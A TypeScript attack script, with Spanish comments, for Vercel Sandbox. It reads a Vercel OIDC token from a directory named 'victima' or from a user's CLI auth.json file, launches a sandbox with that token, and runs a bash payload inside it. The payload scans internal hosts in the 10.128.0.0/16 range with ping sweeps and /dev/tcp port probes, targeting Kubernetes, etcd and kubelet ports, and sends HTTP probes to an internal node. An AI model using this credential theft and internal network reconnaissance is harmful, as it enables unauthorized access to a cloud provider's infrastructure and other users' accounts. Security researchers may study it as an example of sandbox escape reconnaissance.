import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

const SCRIPT = `
set +e
echo "=== 1. alcanzabilidad del nodo interno 10.128.180.118 ==="
echo "--- ruta ---"
ip route get 10.128.180.118 2>/dev/null
echo "--- ping ---"
timeout 2 ping -c 2 -W 1 10.128.180.118 2>&1 | tail -2
echo "--- puertos TCP ---"
for p in 22 80 443 53 3000 8080 2379 2380 6443 10250 10255 9100 9090 4317 50051; do
  timeout 2 bash -c "timeout 0.4 bash -c 'echo > /dev/tcp/10.128.180.118/$p' 2>/dev/null && echo OPEN 10.128.180.118:$p" || true
done
echo ""
echo "=== 2. escanear la subred /24 del nodo (10.128.180.x) ==="
for i in 1 2 3 4 5 10 20 50 100 118 119 120 150 200 254; do
  timeout 1 ping -c 1 -W 1 10.128.180.$i >/dev/null 2>&1 && echo "ALIVE 10.128.180.$i"
done
echo "--- TCP 443/80 en algunos vivos ---"
for i in 118 119 120 1 2; do
  timeout 1 bash -c "timeout 0.3 bash -c 'echo > /dev/tcp/10.128.180.$i/443' 2>/dev/null && echo OPEN443 10.128.180.$i" || true
  timeout 1 bash -c "timeout 0.3 bash -c 'echo > /dev/tcp/10.128.180.$i/80' 2>/dev/null && echo OPEN80 10.128.180.$i" || true
done
echo ""
echo "=== 3. muestreo de la red 10.128.0.0/16 ==="
for a in 0 128 180 200; do
  for b in 1 2 3 100 118; do
    timeout 1 ping -c 1 -W 1 10.128.$a.$b >/dev/null 2>&1 && echo "ALIVE 10.128.$a.$b"
  done
done
echo ""
echo "=== 4. traceroute hacia el nodo (cuantos saltos) ==="
for ttl in 1 2 3 4 5 6 7 8; do
  r=$(timeout 2 ping -c 1 -t $ttl -W 1 10.128.180.118 2>&1 | grep -oE "From [0-9.]+" | awk '{print $2}')
  echo "ttl=$ttl -> NOHIT"
done
echo ""
echo "=== 5. la IP del nodo es la misma que la del peer del ingress? comparar ==="
echo "peer de ingress (visto antes): 100.64.0.1"
echo "nodo interno (de x-forwarded-for): 10.128.180.118"
echo ""
echo "=== 6. http al nodo: que responde? ==="
for port in 80 443 3000 8080; do
  code=$(timeout 3 curl -sk -o /tmp/r -w "%{http_code}" --max-time 2 "http://10.128.180.118:$port/" 2>/dev/null)
  echo "http://10.128.180.118:$port -> $code : $(head -c 80 /tmp/r 2>/dev/null | tr -d '\\n')"
done
echo "=== DONE ==="
`;

async function main() {
  const sbx = await Sandbox.create({
    name: "node128-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 120_000 });
  const out = await r.output("both");
  console.log(out);
  console.log("DONE");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });